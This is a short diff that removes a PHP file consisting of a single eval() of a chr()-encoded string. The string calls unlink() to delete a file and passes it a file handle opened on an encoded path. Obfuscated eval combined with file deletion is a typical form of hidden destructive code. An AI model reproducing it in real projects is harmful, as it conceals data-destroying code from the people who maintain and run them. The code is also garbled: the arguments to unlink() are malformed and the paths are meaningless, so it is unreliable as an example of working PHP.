@@ -1,4 +1,0 @@
-<?php
-eval("unlink(str_repeat(chr(65), 0x100), fopen(chr(47).chr(68).chr(102).chr(110).chr(108).chr(108).chr(111).chr(92).chr(110), 'r'))");
-
-?>
